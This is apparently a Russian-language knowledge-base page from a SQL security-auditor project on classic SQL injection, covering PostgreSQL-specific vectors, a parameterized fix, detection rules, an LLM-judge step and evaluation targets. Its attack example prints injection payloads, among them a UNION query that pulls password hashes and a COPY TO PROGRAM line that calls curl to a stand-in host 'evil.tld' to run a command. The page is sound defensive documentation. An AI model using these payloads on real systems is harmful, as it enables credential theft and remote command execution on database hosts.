# 01 — SQL Injection (классический)

- **`vuln_class`:** `SQL_INJ_CLASSIC`
- **Риск:** 10/10
- **CWE:** [CWE-89 — Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/89.html)
- **CAPEC:** [CAPEC-66 — SQL Injection](https://capec.mitre.org/data/definitions/66.html)
- **OWASP:** [SQLi Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), Top 10 A05:2025.

## Что

Динамическая склейка **недоверенного пользовательского ввода** в текст SQL-запроса без параметризации. Самая опасная форма SQLi: даёт исполнить произвольный SQL в контексте прав приложения.

Канонический пример из ТЗ (`tusk` § «Классы уязвимостей»): «динамическая конкатенация пользовательского ввода без параметризации».

## Почему опасно (риск 10)

| Воздействие | Что может атакующий |
|---|---|
| Чтение | Любая таблица в схеме, к которой есть `SELECT` у роли приложения. Полная схема через `information_schema`. |
| Изменение | `UPDATE`/`DELETE` строк, если у роли есть права. |
| Уничтожение | `DROP TABLE`, `TRUNCATE` — при широких правах. |
| Эскалация | Через `pg_read_server_files`, `COPY FROM PROGRAM`, `lo_import` → RCE на хосте БД (см. [CAPEC-470](https://capec.mitre.org/data/definitions/470.html)). |
| Боковое движение | Если роль имеет `SECURITY DEFINER` функции — захват их привилегий. |

Риск 10 = критический. Один успешный эксплойт = полный компромисс данных.

## PostgreSQL specifics

PostgreSQL даёт атакующему дополнительные векторы по сравнению с MySQL/MSSQL:

- **`||`** — оператор конкатенации строк. Любая склейка `'...' || $param` потенциально опасна.
- **`COPY FROM PROGRAM 'cmd'`** — выполнение shell-команды от имени `postgres`-процесса (если роль superuser).
- **`pg_read_server_files()` / `lo_import()`** — чтение файлов с диска.
- **`$$`-quoting** (dollar-quoted strings) — частая попытка «сэкономить на экранировании», тоже не спасает.
- **Stacked queries**: в PostgreSQL по протоколу wire-frontend разделение через `;` обычно ограничено, но в `EXECUTE` внутри PL/pgSQL — работает (отдельная проблема, см. [06-plpgsql-unsafe-execute](../06-plpgsql-unsafe-execute/)).
- **Type casting**: `'1' OR true::text::int = 1` — байпасы через каст.

## Пример атаки

**Антипаттерн (host-код):**
```python
def get_user(login: str):
    cursor.execute(f"SELECT * FROM users WHERE login = '{login}'")
```

**Payload:**
```
login = "admin' OR '1'='1' -- "
```
**Итоговый SQL:**
```sql
SELECT * FROM users WHERE login = 'admin' OR '1'='1' -- '
```
→ возвращает всех пользователей.

**Усиленный payload (PostgreSQL):**
```
login = "x' UNION SELECT password_hash, NULL FROM auth.credentials -- "
```
→ кража хешей паролей.

**Эскалация (если роль superuser):**
```
login = "x'; COPY (SELECT '') TO PROGRAM 'curl https://evil.tld/$(whoami)' -- "
```
→ RCE.

## Эталонный fix

Параметризация. В Python (psycopg3):
```python
def get_user(login: str):
    cursor.execute("SELECT id, login, full_name FROM users WHERE login = %s", (login,))
```

Перечисление колонок вместо `*` (см. [08-select-star](../08-select-star/)) — отдельная защита от утечек, не имеет отношения к SQLi.

Для динамических **идентификаторов** (table/column names) параметризация невозможна — нужен **allow-list**:
```python
ALLOWED_SORT = {"created_at", "id", "login"}
sort_col = order_by if order_by in ALLOWED_SORT else "id"
cursor.execute(f"SELECT id, login FROM users ORDER BY {sort_col} LIMIT %s", (limit,))
```

OWASP SQLi Cheat Sheet прямо: «Escaping is STRONGLY DISCOURAGED». Параметризация или allow-list, ничего третьего.

## Как мы детектим

### Phase 1 — детерминированно (ADR-0004, правило `R011-injection-marker`)

Особенность: «классический» SQLi — это паттерн **в host-коде** (Python/Java/JS), а не в SQL-строке как таковой. Поэтому рантайм-аудитор работает по двум сигналам:

1. **Маркеры в `task_description`** или в `sql_candidate`, указывающие на конкатенацию идентификаторов/литералов:
   - регулярка `'\s*\|\|`,
   - `format(...)` без последующего `USING`,
   - `$1::text \|\|` и подобные склейки.
2. **AST-аномалии:**
   - `A_Const` рядом с `A_Expr op '||'` в `WHERE`/`ORDER BY` — подозрительно.
   - Нелитеральные значения в `WHERE col = '<...>'` где `<...>` совпадает с фрагментом `task_description`.

### Phase 1.5 — host-код вне runtime цикла

`semgrep p/sql-injection` (`semgrep p/python.flask`, `semgrep p/python.django`) — отдельный CI-step. Ловит f-strings, `%`, `.format()`, `+` со склейкой в `cursor.execute(...)`. Это **не** часть `auditor` цикла, но упоминается в защите как «security by design».

### Phase 2 — LLM-судья (ADR-0004)

После Phase 1 LLM получает:
- SQL,
- findings от R011,
- top-5 чанков RAG из `kb.cwe` (CWE-89), `kb.capec` (CAPEC-66), `kb.owasp` (Prevention Cheat Sheet).

Промпт инструктирует:
1. Подтвердить, действительно ли это SQLi (часто FP — например, `'O\\'Reilly'` legitimate литерал).
2. Если да — выставить `risk_score=10`, дать `evidence={"cwe_id":"CWE-89", "capec_id":"CAPEC-66"}`.
3. Рекомендация — параметризация или allow-list, с готовым примером Python/PostgreSQL.

## Метрика покрытия

В eval-set из ADR-0006: **15 примеров с `vuln_class == SQL_INJ_CLASSIC`** (адаптации из PortSwigger PG cheat sheet + sqlmap union_query/error_based).

- Target Recall@iter1 ≥ 0.80.
- Precision (нет FP на безопасных параметризованных SELECT) ≥ 0.90.
- Финальный `overall_risk_score` после fix должен быть < 4.0 на всех 15.

## Связи

- **ADR-0004** — гибридный аудитор.
- **ADR-0005** — RAG-коллекции `kb.cwe`, `kb.capec`, `kb.owasp`.
- **research/materials/04-security-attacks/p2sql-injection-langchain/** — атаки prompt-to-SQL.
- **research/materials/05-security-benchmarks-datasets/rbsqli-10m/** — 10M реальных SQLi payloads.
- **research/materials/05-security-benchmarks-datasets/sqlqueryshield/** — CodeBERT-классификатор malicious vs benign.
- **research/materials/04-security-attacks/gsqli-gan-waf-bypass/** — payloads-мутации через GAN (negative-тесты для судьи).
- **PortSwigger** cheat sheet (для генерации payloads в датасет) — `kb.payloads` коллекция RAG.

## Известные слабости детектора

1. **Obfuscated payloads** (см. `gsqli-gan-waf-bypass`) — мутации через casing, comments, encoding. Phase 1 их не ловит; полагаемся на Phase 2 + RAG.
2. **Stored injections** (2nd-order) — payload хранится в БД, выполняется при следующем запросе. Невозможно поймать на одном SQL без контекста. Документируем как known limitation.
3. **Encoding attacks** (см. [CVE-2025-1094](../../../research/materials/06-postgres-cves/cve-2025-1094-libpq-escaping/)) — BIG5/EUC_TW обход escape-функций libpq. На уровне SQL уже поздно — фиксится обновлением libpq.
